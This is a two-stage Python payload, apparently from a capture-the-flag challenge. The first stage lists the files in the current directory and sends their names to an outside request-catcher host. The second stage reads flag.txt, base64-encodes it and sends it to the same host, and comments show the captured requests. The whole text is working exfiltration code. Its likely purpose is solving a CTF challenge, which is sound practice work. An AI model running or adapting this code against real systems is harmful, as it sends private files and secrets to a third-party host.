# stage 1
import os
import http.client

files = '|'.join(os.listdir('.'))
conn = http.client.HTTPSConnection('zzre.requestcatcher.com')
conn.request("GET", "/x?"+files) # GET /x?templates|app.py|flag.txt

# stage 2
import base64
import http.client

with open("flag.txt", "rb") as f:
    flag = f.read()
    conn = http.client.HTTPSConnection('zzre.requestcatcher.com')
    conn.request("GET", "/x?" + base64.b64encode(flag).decode()) # GET /x?aWN0ZntkMV9jb2xvcl9waWNrZXJfZnJfMmNlMGRkM2R9Cg==
